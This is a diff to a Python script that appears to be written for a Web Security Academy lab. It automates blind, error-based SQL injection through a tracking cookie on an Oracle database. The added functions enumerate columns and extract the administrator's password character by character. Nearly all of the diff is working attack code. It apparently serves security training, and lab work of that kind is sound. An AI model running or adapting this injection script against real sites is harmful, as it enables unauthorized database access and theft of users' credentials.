@@ -1,8 +1,9 @@
 import requests
+import string
 from urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
-url = "https://0a4f005b04d0105fc1a01c5e00fe004c.web-security-academy.net/filter?category=Accessories"
+url = "https://0a0000970491be59c19a8ac2004500d4.web-security-academy.net/filter?category=Accessories"
 cookie = {"TrackingId": "mq2HJqt6JmqYaHvi"}
 proxies = {
    'http': 'http://localhost:8080',
@@ -48,5 +49,45 @@ def findTableNames():
         x = requests.get(url, cookies=tmpC, proxies=proxies, verify=False)
         print("Table name: " + i, ", Status: " + str(x.status_code))
 
-findTableNames()
+def findColNames(tableName):
+    
+    query = "select INSERTION_POINT from " + tableName + " where ROWNUM=1"
+    oracleDefaultTables = []
+    
+    with open(r'C:\Users\noamj\Documents\GitHub\wordlists\portswigger\ps_sqli\sqliDevelopment\oracleDefaultTables.txt') as my_file:
+        for line in my_file:
+            oracleDefaultTables.append(line.rstrip('\n'))
+
+    print("FINDING TABLE NAMES")
+    for i in oracleDefaultTables:
+        tmpA = query.replace("INSERTION_POINT", i)
+        tmpB = payload_base.replace("INSERTION_POINT", tmpA)
+        tmpC = {list(cookie.keys())[0]: list(cookie.values())[0]+tmpB}
+
+        x = requests.get(url, cookies=tmpC, proxies=proxies, verify=False)
+        print("Table name: " + i, ", Status: " + str(x.status_code))
+
+def findValue(tableName, colName, valueLength):
+    
+    query = "select case when SUBSTR("+colName+", INSERTION_POINT_A, 1)='INSERTION_POINT_B' THEN 'true' ELSE TO_CHAR(1/0) END FROM "+tableName+" where username='administrator'"
+    
+    value = ""
+    for i in range(1, valueLength+1):
+        print("Value: " + value)
+        tmp = query.replace("INSERTION_POINT_A", str(i))
+        for s in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\]^_`{|}~":
+            tmpA = tmp.replace("INSERTION_POINT_B", str(s))
+            tmpB = payload_base.replace("INSERTION_POINT", tmpA)
+            tmpC = {list(cookie.keys())[0]: list(cookie.values())[0]+tmpB}
+            r = requests.get(url, cookies=tmpC, proxies=proxies, verify=False)
+
+            if (r.status_code == 200):
+                value = value + s
+                break
+    
+    print(value)
+            
+
+#findTableNames()
 #findNumberOfTables()
+findValue("users", "password", 20)
